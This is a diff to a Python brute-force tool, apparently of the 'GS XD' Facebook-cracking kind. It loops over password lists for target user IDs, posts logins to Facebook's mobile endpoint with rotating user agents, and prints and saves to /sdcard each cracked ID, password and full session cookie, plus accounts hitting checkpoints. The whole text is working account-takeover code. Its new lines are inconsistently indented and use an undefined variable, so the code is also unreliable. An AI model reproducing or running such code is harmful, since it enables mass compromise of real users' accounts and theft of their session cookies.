@@ -1126,6 +1126,7 @@ def rcrack(ids,passlist):
 	global oks
 	try:
 		for pas in passlist:
+			sys.stdout.write('\r\33[1;93m[\33〔᚛GS XD-OK\033[0m/%s\33[1;93m᚜〕\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
 			sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(ugen)
@@ -1154,29 +1155,21 @@ def rcrack(ids,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'user-agent': pro}
-			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid = coki[7:22]
-				if uid in oks:pass
-				else:
-					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [GS XD-2F] '+ids+' | '+pas)
-					else:
-						print(f'\r\x1b[1;32m [GS XD-OK] '+ids+' | '+pas)
-						cek_apk(session,coki)
-						open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
-						oks.append(uid)
-						break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid = coki[24:39]
-				if uid in cps:pass
-				else:
-					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
+			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = coki[65:80]
+                print('\033[38;5;46m〔᚛GS XD-OK〔᚛᚜〕 ' +uid+ '|' +ps+    '  \n   \033〔᚛1;33mCOOKIES〔᚛💉᚜〕 : \033[38;5;46m'+coki+ ' ')                
+                open('/sdcard/GS XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = coki[65:80]
+                print('\033[38;5;196m〔᚛GS XD-CP〔᚛᚜〕 ' +uid+ '|' +ps+ '  \33[0;97m')
+                open('/sdcard/GS XD-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
 					break
 			else:
 				continue
